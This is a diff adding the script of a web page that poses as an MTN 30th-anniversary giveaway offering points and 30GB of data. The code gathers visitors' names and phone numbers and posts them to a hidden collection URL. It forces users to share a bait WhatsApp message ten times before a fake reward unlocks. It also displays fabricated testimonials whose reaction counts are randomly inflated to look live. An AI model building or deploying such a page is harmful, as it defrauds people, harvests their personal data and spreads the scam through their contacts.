+                comment: 'This is the surprise of the year! Thank you MTN for the 30th anniversary gift! 🎁',
+                points: 3000,
+                data: 30,
+                likes: 378,
+                replies: 72,
+                shares: 34
+            }
+        ];
+
+        let currentDisplayedIndices = [];
+
+        // Initialize Application
+        document.addEventListener('DOMContentLoaded', () => {
+            loadState();
+            initializeEventListeners();
+            rotateComments();
+            startCommentRotation();
+            updateProgressBar();
+            updateShareButtonState();
+        });
+
+        // Event Listeners
+        function initializeEventListeners() {
+            const registrationForm = document.getElementById('registrationForm');
+            const whatsappShareBtn = document.getElementById('whatsappShareBtn');
+            const claimRewardBtn = document.getElementById('claimRewardBtn');
+            const activateBtn = document.getElementById('activateButton');
+
+            if (registrationForm) registrationForm.addEventListener('submit', handleRegistration);
+            if (whatsappShareBtn) whatsappShareBtn.addEventListener('click', handleWhatsAppShare);
+            if (claimRewardBtn) claimRewardBtn.addEventListener('click', handleClaimReward);
+            if (activateBtn) activateBtn.addEventListener('click', activateAndNextUser);
+        }
+
+        // Registration Handler
+        function handleRegistration(e) {
+            e.preventDefault();
+
+            const fullName = document.getElementById('fullName').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+
+            if (!fullName || !phoneNumber) {
+                alert('Please fill in all fields');
+                return;
+            }
+
+            // Update state but DO NOT send to WEB_APP_URL here.
+            appState.isRegistered = true;
+            appState.userInfo = {
+                fullName,
+                phoneNumber,
+                registeredAt: new Date().toISOString(),
+            };
+
+            // Show success message
+            const successMessage = document.getElementById('successMessage');
+            successMessage.style.display = 'block';
+
+            // Disable form
+            const inputs = document.querySelectorAll('.registration-form input');
+            inputs.forEach(input => input.disabled = true);
+
+            // Disable submit button
+            const submitBtn = document.querySelector('.btn-submit');
+            if (submitBtn) submitBtn.disabled = true;
+
+            // Hide register prompt
+            const rp = document.getElementById('registerPrompt');
+            if (rp) rp.style.display = 'none';
+
+            saveState();
+            updateShareButtonState();
+
+            console.log('Registration stored locally. It will be sent to the Web App on Activate.');
+        }
+
+        // WhatsApp Share Handler with Open Graph Meta Tags Support
+        function handleWhatsAppShare() {
+            if (!appState.isRegistered) {
+                document.getElementById('registerPrompt').style.display = 'block';
+                return;
+            }
+
+            if (appState.shareCount >= 10) {
+                alert('You have reached the maximum shares!');
+                return;
+            }
+
+            // Increment share count
+            appState.shareCount++;
+            updateProgressBar();
+            saveState();
+
+            // Show share message
+            showShareMessage();
+
+            // Update share button state
+            updateShareButtonState();
+
+            // WhatsApp Share Logic with banner preview support
+            // The message includes a link that will display a preview with Open Graph meta tags
+            const shareMessage = encodeURIComponent(
+                `MTN @ 30 promo is still live.\nShare and earn 3,000 points + 30GB data\n\nEnter here and claim your reward:\nhttps://www.livescores.com\n\n✨ Increase your chance of winning ✨`
+            );
+            window.open(
+                `https://api.whatsapp.com/send?text=${shareMessage}`,
+                '_blank',
+                'width=500,height=600'
+            );
+        }
+
+        // Claim Reward Handler - open popup and monitor for 10 seconds being open
+        function handleClaimReward() {
+            if (!appState.isRegistered) {
+                alert('Please register first!');
+                return;
+            }
+
+            if (appState.shareCount < 10) {
+                alert('You need to share 10 times to claim your reward!');
+                return;
+            }
+
+            appState.claimedReward = true;
+            saveState();
+
+            // Open reward site in a new tab/window
+            const rewardUrl = 'https://www.livescores.com';
+            const rewardWin = window.open(rewardUrl, '_blank');
+
+            if (!rewardWin) {
+                // Popup blocked by browser
+                console.warn('Popup blocked. Cannot monitor reward site. Confirmation will not be shown.');
+                return;
+            }
+
+            // Monitor that the opened window stays open for at least 10 seconds
+            const start = Date.now();
+            const maxWait = 10000; // 10 seconds
+            const checkInterval = 300;
+            const intervalId = setInterval(() => {
+                // If closed before 10s -> do nothing (don't show confirmation)
+                if (rewardWin.closed) {
+                    clearInterval(intervalId);
+                    console.log('Reward window was closed before 10 seconds. Not showing confirmation.');
+                    return;
+                }
+
+                // If still open after 10s -> show confirmation
+                if (Date.now() - start >= maxWait) {
+                    clearInterval(intervalId);
+                    showConfirmationBanner();
+                    return;
+                }
+            }, checkInterval);
+
+            // Do NOT close the rewardWin after monitoring — per instructions we forget about it
+        }
+
+        // Show Confirmation Banner
+        function showConfirmationBanner() {
+            const confirmationBanner = document.getElementById('confirmationBanner');
+            confirmationBanner.style.display = 'block';
+
+            // Scroll to confirmation
+            setTimeout(() => {
+                confirmationBanner.scrollIntoView({ behavior: 'smooth' });
+            }, 500);
+        }
+
+        // Activate: send user info to WEB_APP_URL then refresh for next user
+        function activateAndNextUser() {
+            const activateBtn = document.getElementById('activateButton');
+            if (activateBtn) {
+                activateBtn.disabled = true;
+                activateBtn.textContent = 'Activating...';
+            }
+
+            if (!appState.userInfo || !appState.isRegistered) {
+                alert('No registered user to activate.');
+                // ensure local state cleared for next user then reload
+                localStorage.removeItem('appState');
+                setTimeout(() => location.reload(), 300);
+                return;
+            }
+
+            // Capture payload to send
+            const payload = {
+                name: appState.userInfo.fullName,
+                phone: appState.userInfo.phoneNumber
+            };
+
+            // Clear saved state so reload shows empty form for next user
+            try {
+                localStorage.removeItem('appState');
+            } catch (e) {
+                console.warn('Could not remove appState from localStorage:', e);
+            }
+
+            // Update in-memory state and UI immediately so another user can start entering data
+            appState = {
+                isRegistered: false,
+                userInfo: null,
+                shareCount: 0,
+                claimedReward: false,
+                sentToWebApp: false
+            };
+            // Reset UI (immediate)
+            const inputs = document.querySelectorAll('.registration-form input');
+            inputs.forEach(input => {
+                input.disabled = false;
+                input.value = '';
+            });
+            const successMessage = document.getElementById('successMessage');
+            if (successMessage) successMessage.style.display = 'none';
+            const submitBtn = document.querySelector('.btn-submit');
+            if (submitBtn) submitBtn.disabled = false;
+            updateProgressBar();
+            updateShareButtonState();
+
+            // Send POST request with name and phone
+            fetch(WEB_APP_URL, {
+                method: "POST",
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(res => {
+                // optionally mark as sent
+                appState.sentToWebApp = true;
+                // reload after a short delay so the page refreshes for next user
+                setTimeout(() => location.reload(), 400);
+            })
+            .catch(err => {
+                console.error('Error sending activation data:', err);
+                // reload anyway so next user can start
+                setTimeout(() => location.reload(), 700);
+            });
+        }
+
+        // ==================== COMMENT SUBMISSION ====================
+        // New behavior: open COMMENT_SUBMISSION_URL in a new tab when user clicks Submit Comment & Continue
+        function handleCommentSubmit(event) {
+            event.preventDefault();
+
+            const commentEl = document.getElementById('commentText');
+            const commentStatus = document.getElementById('commentStatus');
+            const comment = commentEl ? commentEl.value.trim() : '';
+
+            if (!comment) {
+                alert('Please write a comment');
+                return;
+            }
+
+            // Build URL with comment as query parameter
+            const encodedComment = encodeURIComponent(comment);
+            const targetUrl = `${COMMENT_SUBMISSION_URL}?comment=${encodedComment}`;
+
+            // Open the comment submission page in a new tab
+            try {
+                window.open(targetUrl, '_blank');
+            } catch (e) {
+                console.error('Error opening comment submission URL:', e);
+            }
+
+            // Clear the textarea immediately
+            if (commentEl) {
+                commentEl.value = '';
+            }
+
+            // Display the status message
+            if (commentStatus) {
+                commentStatus.textContent = 'Your Comment Will appear soon';
+                commentStatus.style.display = 'block';
+            }
+
+            // Optionally save or log
+            console.log('Comment submitted via:', COMMENT_SUBMISSION_URL);
+        }
+
+        // Reset for next user (kept for compatibility)
+        function resetForNextUser() {
+            localStorage.removeItem('appState');
+            appState = {
+                isRegistered: false,
+                userInfo: null,
+                shareCount: 0,
+                claimedReward: false,
+                sentToWebApp: false
+            };
+
+            // Reset UI
+            const regForm = document.getElementById('registrationForm');
+            if (regForm) regForm.reset();
+            const confirmationBanner = document.getElementById('confirmationBanner');
+            if (confirmationBanner) confirmationBanner.style.display = 'none';
+            const successMessage = document.getElementById('successMessage');
+            if (successMessage) successMessage.style.display = 'none';
+            const registerPrompt = document.getElementById('registerPrompt');
+            if (registerPrompt) registerPrompt.style.display = 'none';
+            const shareMessage = document.getElementById('shareMessage');
+            if (shareMessage) shareMessage.style.display = 'none';
+            const commentStatus = document.getElementById('commentStatus');
+            if (commentStatus) commentStatus.style.display = 'none';
+
+            // Enable form inputs
+            const inputs = document.querySelectorAll('.registration-form input');
+            inputs.forEach(input => input.disabled = false);
+            const submitBtn = document.querySelector('.btn-submit');
+            if (submitBtn) submitBtn.disabled = false;
+
+            updateProgressBar();
+            updateShareButtonState();
+
+            const regSection = document.getElementById('registrationSection');
+            if (regSection) regSection.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Update Progress Bar
+        function updateProgressBar() {
+            const percentage = Math.min((appState.shareCount / 10) * 100, 100);
+            const fill = document.getElementById('progressFill');
+            const shareCountEl = document.getElementById('shareCount');
+            const percentageEl = document.getElementById('progressPercentage');
+
+            if (fill) fill.style.width = percentage + '%';
+            if (shareCountEl) shareCountEl.textContent = appState.shareCount;
+            if (percentageEl) percentageEl.textContent = Math.floor(percentage);
+
+            // Update message
+            const remaining = Math.max(10 - appState.shareCount, 0);
+            const message = document.querySelector('.progress-message');
+            
+            if (appState.shareCount >= 10) {
+                message.textContent = '✓ You\'ve reached 100%! Claim your reward now! 🎉';
+                message.classList.remove('close-message');
+            } else if (appState.shareCount >= 5) {
+                message.textContent = `🎁 Almost there! ${remaining} more share${remaining !== 1 ? 's' : ''} to go!`;
+                message.classList.add('close-message');
+            } else {
+                message.textContent = `Share ${remaining} more time${remaining !== 1 ? 's' : ''} to unlock your reward! 🎁`;
+                message.classList.remove('close-message');
+            }
+
+            // Update Claim Reward button state
+            updateClaimRewardButton();
+        }
+
+        // Update Claim Reward Button
+        function updateClaimRewardButton() {
+            const claimBtn = document.getElementById('claimRewardBtn');
+            if (!claimBtn) return;
+            if (appState.shareCount >= 10) {
+                claimBtn.classList.remove('locked');
+                claimBtn.disabled = false;
+                claimBtn.innerHTML = '<span class="btn-text">🎁 Claim Reward (10/10)</span>';
+            } else {
+                claimBtn.classList.add('locked');
+                claimBtn.disabled = true;
+                claimBtn.innerHTML = `<span class="lock-icon">🔒</span><span class="btn-text">Claim Reward (${appState.shareCount}/10)</span>`;
+            }
+        }
+
+        // Update Share Button State
+        function updateShareButtonState() {
+            const shareBtn = document.getElementById('whatsappShareBtn');
+            if (!shareBtn) return;
+            if (appState.shareCount >= 10) {
+                shareBtn.disabled = true;
+                shareBtn.textContent = '✓ Max Shares Reached';
+            } else {
+                shareBtn.disabled = false;
+                shareBtn.innerHTML = '<i class="fab fa-whatsapp"></i> Share on WhatsApp';
+            }
+        }
+
+        // Show Share Message
+        function showShareMessage() {
+            const message = document.getElementById('shareMessage');
+            const countMessage = document.getElementById('shareCountMessage');
+            if (countMessage) countMessage.textContent = `You now have ${appState.shareCount} share${appState.shareCount !== 1 ? 's' : ''} (${appState.shareCount * 10}%)`;
+            if (message) message.style.display = 'block';
+
+            setTimeout(() => {
+                if (message) message.style.display = 'none';
+            }, 3000);
+        }
+
+        // ==================== FACEBOOK COMMENTS ROTATION ====================
+        function rotateComments() {
+            // Select 5 random commenters from all 30
+            currentDisplayedIndices = [];
+            const shuffled = [...Array(allCommenters.length).keys()].sort(() => 0.5 - Math.random());
+            currentDisplayedIndices = shuffled.slice(0, 5);
+            
+            populateComments();
+        }
+
+        function populateComments() {
+            const container = document.getElementById('commentsContainer');
+            if (!container) return;
+            
+            container.innerHTML = '';
+
+            currentDisplayedIndices.forEach((index) => {
+                const commentData = allCommenters[index];
+                const commentEl = document.createElement('div');
+                commentEl.className = 'facebook-comment';
+                
+                // Simulate live reaction updates
+                const liveReactions = {
+                    likes: commentData.likes + Math.floor(Math.random() * 50),
+                    replies: commentData.replies + Math.floor(Math.random() * 15),
+                    shares: commentData.shares + Math.floor(Math.random() * 8)
+                };
+                
+                commentEl.innerHTML = `
+                    <div class="avatar">
+                        <img src="${commentData.picture}" alt="${commentData.name}" onerror="this.parentElement.textContent='${commentData.name.split(' ').map(n => n[0]).join('')}'">
+                    </div>
+                    <div class="comment-content">
+                        <div class="comment-header">
+                            <span class="comment-name">${commentData.name}</span>
+                            <span class="comment-time">${commentData.time}</span>
+                        </div>
+                        <div class="comment-text">${commentData.comment}</div>
+                        <div class="comment-rewards">
+                            ✓ Received: ${commentData.points.toLocaleString()} Points + ${commentData.data}GB Data
+                        </div>
+                        <div class="comment-reactions">
+                            <span class="reaction-item">
+                                <i class="fas fa-thumbs-up" style="color: #4169E1;"></i> <span>${liveReactions.likes}</span>
+                            </span>
+                            <span class="reaction-item">
+                                <i class="fas fa-reply"></i> <span>${liveReactions.replies}</span>
+                            </span>
+                            <span class="reaction-item">
+                                <i class="fas fa-share"></i> <span>${liveReactions.shares}</span>
+                            </span>
+                        </div>
+                    </div>
+                `;
+                
+                container.appendChild(commentEl);
+            });
+        }
+
+        function startCommentRotation() {
+            // Rotate comments every 1 hour (3600000 milliseconds)
+            setInterval(() => {
+                rotateComments();
+            }, 3600000);
+
+            // Update live reactions every 5 seconds
+            setInterval(() => {
+                populateComments();
+            }, 5000);
+        }
+
+        // Local Storage Functions
+        function saveState() {
+            try {
+                localStorage.setItem('appState', JSON.stringify(appState));
+            } catch (e) {
+                console.warn('Could not save appState to localStorage:', e);
+            }
+        }
+
+        function loadState() {
+            const saved = localStorage.getItem('appState');
+            if (saved) {
+                try {
+                    appState = JSON.parse(saved);
+                } catch (e) {
+                    console.error('Could not parse saved appState:', e);
+                }
+
+                // Restore UI state
+                if (appState.isRegistered && appState.userInfo) {
+                    const fn = document.getElementById('fullName');
+                    const pn = document.getElementById('phoneNumber');
+                    if (fn) fn.value = appState.userInfo.fullName;
+                    if (pn) pn.value = appState.userInfo.phoneNumber;
+                    if (fn) fn.disabled = true;
+                    if (pn) pn.disabled = true;
+                    const submitBtn = document.querySelector('.btn-submit');
+                    if (submitBtn) submitBtn.disabled = true;
+
+                    const successMessage = document.getElementById('successMessage');
+                    if (successMessage) successMessage.style.display = 'block';
+                    const prompt = document.getElementById('registerPrompt');
+                    if (prompt) prompt.style.display = 'none';
+                }
+            }
+        }
+
+        // Add smooth scroll behavior for same-page anchors (if any)
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth' });
+                }
+            });
+        });
+
+        // Performance optimization - Lazy load images (works if you use data-src attributes)
+        if ('IntersectionObserver' in window) {
+            const imageObserver = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        const img = entry.target;
+                        if (img.dataset && img.dataset.src) {
+                            img.src = img.dataset.src;
+                        }
+                        observer.unobserve(img);
+                    }
+                });
+            });
+
+            document.querySelectorAll('img[data-src]').forEach(img => {
+                imageObserver.observe(img);
+            });
+        }
+    </script>
+</body>
+</html>
